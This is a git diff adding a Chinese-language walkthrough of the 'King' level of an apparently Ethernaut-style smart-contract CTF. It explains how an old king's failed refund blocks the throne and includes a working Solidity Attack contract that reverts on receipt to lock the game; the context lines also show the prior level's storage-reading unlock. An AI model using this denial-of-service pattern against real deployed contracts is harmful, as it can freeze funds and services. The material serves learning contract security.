@@ -386,3 +386,64 @@ await web3.eth.getStorageAt(instance, 1).then(web3.utils.toAscii)
 // 补充： 通过 web3.utils.toAscii / web3.utils.toHex 可以转为可见字符或者/bytes
 await contract.unlock('0x412076657279207374726f6e67207365637265742070617373776f7264203a29')
 ```
+
+# King
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract King {
+    address king;
+    uint256 public prize;
+    address public owner;
+
+    constructor() payable {
+        owner = msg.sender;
+        king = msg.sender;
+        prize = msg.value;
+    }
+
+    receive() external payable {
+        require(msg.value >= prize || msg.sender == owner);
+        payable(king).transfer(msg.value);
+        king = msg.sender;
+        prize = msg.value;
+    }
+
+    function _king() public view returns (address) {
+        return king;
+    }
+}
+```
+合约通过发送超过当前 prize 的以太坊成为“国王”（king），而被推翻的国王将获得 prize 的奖励。这是一种类似于庞氏骗局的游戏机制，游戏的设计鼓励参与者不断增加 prize 以争夺国王的位置。
+攻击目标是破坏这个合约，即在成为新的国王后，其他人也不能通过发送更高的 prize 夺取国王的位置。并且 submit 时也会尝试夺权，如果夺权失败则通关。
+- 合约中的潜在问题在于：当新的国王被推翻时，旧的国王会收到 prize。如果接收 prize 的操作失败，receive() 函数中的流程就会失败，国王位置将不会被更新。因此，可以利用一种方式阻止国王接收 prize，从而阻止其他人替代国王。部署一个智能合约，该合约的 receive() 函数拒绝接受以太坊，从而导致 King 合约在调用 payable(king).transfer() 时失败。
+
+```js
+// 查看当前 prize
+(await contract.prize()).toNumber()
+```
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Attack {
+    address payable kingContract;
+
+    constructor(address payable _kingContract) payable {
+        kingContract = _kingContract;
+    }
+
+    function attack() public payable {
+        // 向 King 合约发送超过当前 prize 的以太坊，成为国王
+        (bool success, ) = kingContract.call{value: msg.value}("");
+        require(success, "Attack failed");
+    }
+
+    // 通过阻止接收以太坊来破坏 King 合约
+    receive() external payable {
+        revert("Cannot become king");
+    }
+}
+```
